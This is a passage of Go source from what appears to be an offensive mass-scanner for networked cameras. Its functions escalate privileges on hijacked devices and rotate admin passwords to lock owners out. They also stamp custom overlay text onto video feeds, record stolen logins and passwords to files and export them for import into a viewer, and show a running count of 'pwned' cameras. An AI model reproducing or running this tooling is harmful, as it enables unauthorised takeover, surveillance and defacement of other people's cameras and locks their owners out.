		ui.LogNukeResult(serial, "antinuke", false, err)
		return
	}
	defer ns.Closer()
	note := nuke.AntiWhiteSweep(ns)
	ui.LogNukeResult(serial, "antinuke "+note, true, nil)
}

func (s *Scanner) runFortify(tunnel *net.PTCPTunnel, serial string, res *types.ExploitResult) {
	if tunnel == nil || res.Login == "" || res.Password == "" {
		return
	}
	ns, err := nuke.NewNukeSession(tunnel, res.Login, res.Password)
	if err != nil {
		ui.LogNukeResult(serial, "fortify", false, err)
		return
	}
	defer ns.Closer()
	newPass, err := nuke.FortifyAdmin(ns, serial)
	if err != nil {
		ui.LogNukeResult(serial, "fortify", false, err)
		return
	}
	allinPath := filepath.Join(s.OutDir, "allin.txt")
	content, _ := os.ReadFile(allinPath)
	lines := strings.Split(string(content), "\n")
	for i, l := range lines {
		if strings.HasPrefix(l, serial+" |") {
			parts := strings.SplitN(l, "|", 2)
			if len(parts) == 2 {
				lines[i] = serial + " | " + newPass + " |" + parts[1]
			}
		}
	}
	os.WriteFile(allinPath, []byte(strings.Join(lines, "\n")), 0644)

	res.Password = newPass
	ui.LogNukeResult(serial, "forceosd: rotated", true, nil)
}

func (s *Scanner) applyOSDBeforeShot(tunnel *net.PTCPTunnel, serial string, res *types.ExploitResult) {
	if tunnel == nil || res == nil || res.Login == "" || res.Password == "" {
		return
	}
	channel := osd.NormalizeOSDChannel(s.Config.Overlay.Channel)
	lines := osd.NormalizeOSDLines(s.Config.Overlay.Custom)
	if !s.Config.Overlay.Osd || (channel == "" && len(lines) == 0) {
		return
	}
	redial := func() (*net.PTCPTunnel, func(), bool) {
		return s.dialFreshTunnel(serial, res)
	}
	channel = osd.ExpandOSDTemplate(channel, serial, res.Model, res.Password, "")
	for i := range lines {
		lines[i] = osd.ExpandOSDTemplate(lines[i], serial, res.Model, res.Password, "")
	}

	err := osd.TryOSD(tunnel, res.Login, res.Password, channel, lines, osd.StyleFromOverlaySerial(s.Config.Overlay, serial), redial)
	if err != nil {
		ui.LogOSDResult(serial, 5000, false, err)
	} else {
		ui.LogOSDResult(serial, 5000, true, nil)
	}
}

func (s *Scanner) tryPrivesc(tunnel *net.PTCPTunnel, serial string, res *types.ExploitResult) {
	if tunnel == nil || res.Login == "" || res.Password == "" {
		return
	}
	if res.Method != "uau" && res.Method != "creds" {
		return
	}
	ns, err := nuke.NewNukeSession(tunnel, res.Login, res.Password)
	if err != nil {
		return
	}
	defer ns.Closer()
	if exploit.CheckAdminAccess(ns) {
		return
	}

	_ = exploit.PrivescExecute(ns, serial, res.Login, res.Password)

	ns2, err := nuke.NewNukeSession(tunnel, res.Login, res.Password)
	if err != nil {
		return
	}
	defer ns2.Closer()
	if exploit.CheckAdminAccess(ns2) {
		ui.DebugLogf("privesc", "%s > admin confirmed!", serial)
	}
}

func (s *Scanner) handlePwned(serial string, res *types.ExploitResult) {
	webAddr := ""
	if res.IP != "" {
		webAddr = res.IP + ":80"
	}
	ui.LogExploitPwned(serial, res.Method, res.Login, res.Password, webAddr)
	ui.TUIEventOwned(serial, res.Password, "")
	ui.TUIPTZAlert(serial, res.Model)
	if s.DashboardPort > 0 {
		WebCamAdd(serial, res.IP, res.Login, res.Password, res.Model)
	}
	s.mu.Lock()
	s.PwnedCount++
	s.pwnedList = append(s.pwnedList, *res)

	allinPath := filepath.Join(s.OutDir, "allin.txt")
	f, err := os.OpenFile(allinPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		if webAddr != "" {
			fmt.Fprintf(f, "%s | %s | %s | %s | http://%s\n",
				serial, res.Password, res.Login, res.Model, webAddr)
		} else {
			fmt.Fprintf(f, "%s | %s | %s | %s\n",
				serial, res.Password, res.Login, res.Model)
		}
		f.Close()
	}

	s.writeXMLFiles(serial, res)
	s.mu.Unlock()
}

func csvField(s string) string {
	if strings.ContainsAny(s, "\",\n\r") {
		return "\"" + strings.ReplaceAll(s, "\"", "\"\"") + "\""
	}
	return s
}

func (s *Scanner) writeXMLFiles(serial string, res *types.ExploitResult) {
	pwnedIdx := len(s.pwnedList) - 1
	chunkSize := 64
	chunkIdx := pwnedIdx / chunkSize
	xmlFilename := fmt.Sprintf("import_%d.xml", chunkIdx+1)
	xmlPath := filepath.Join(s.OutDir, xmlFilename)

	encPass := FastEnc(res.Password)
	row := BuildDeviceXMLRow(serial, res.Login, encPass)

	if _, err := os.Stat(xmlPath); os.IsNotExist(err) {
		var sb strings.Builder
		sb.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
		sb.WriteString("<DeviceManager version=\"2.0\">\n")
		sb.WriteString(row)
		sb.WriteString("</DeviceManager>\n")
		os.WriteFile(xmlPath, []byte(sb.String()), 0644)
	} else {
		data, err := os.ReadFile(xmlPath)
		if err != nil {
			var sb strings.Builder
			sb.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
			sb.WriteString("<DeviceManager version=\"2.0\">\n")
			sb.WriteString(row)
			sb.WriteString("</DeviceManager>\n")
			os.WriteFile(xmlPath, []byte(sb.String()), 0644)
			return
		}
		content := strings.TrimSuffix(string(data), "</DeviceManager>\n")
		content += row + "</DeviceManager>\n"
		os.WriteFile(xmlPath, []byte(content), 0644)
	}
}

func (s *Scanner) addUnits(n int64) {
	if n <= 0 {
		return
	}
	s.mu.Lock()
	s.doneUnits += n
	s.mu.Unlock()
}

func (s *Scanner) writePwnedStart() {
}

func (s *Scanner) printProgress() {
	s.mu.Lock()
	defer s.mu.Unlock()

	var pct float64 = 0.0
	if s.totalUnits > 0 {
		pct = (float64(s.doneUnits) / float64(s.totalUnits)) * 100.0
	}

	var pctStr string
	if s.CompletedCount >= s.TotalCount {
		pctStr = "100%"
	} else {
		pct = math.Floor(pct*10) / 10
		pctStr = fmt.Sprintf("%.1f%%", pct)
	}

	now := time.Now()
	if !s.startTime.IsZero() {
		if dt := now.Sub(s.lastSample); dt >= 500*time.Millisecond {
			s.lastRate = int64(float64(s.CompletedCount-s.lastCompleted) / dt.Seconds())
			s.lastSample = now
			s.lastCompleted = s.CompletedCount
		}
	}

	line := fmt.Sprintf("[%s] pwned > %d | online > %d | found > %d | waste > %d | %d/s [%s]",
		pctStr, s.PwnedCount, s.OnlineCount, s.AliveVerdicts, s.WasteCount, s.lastRate, ui.FormatElapsed(now.Sub(s.startTime)))
	if ui.TUIActive() {
		ui.TUIStats(s.doneUnits, s.totalUnits, s.AliveVerdicts, s.OnlineCount, s.WasteCount, s.PwnedCount, s.lastRate, s.CompletedCount, now.Sub(s.startTime))
		return
	}
	fmt.Printf("\033[2K\r%s", line)
}
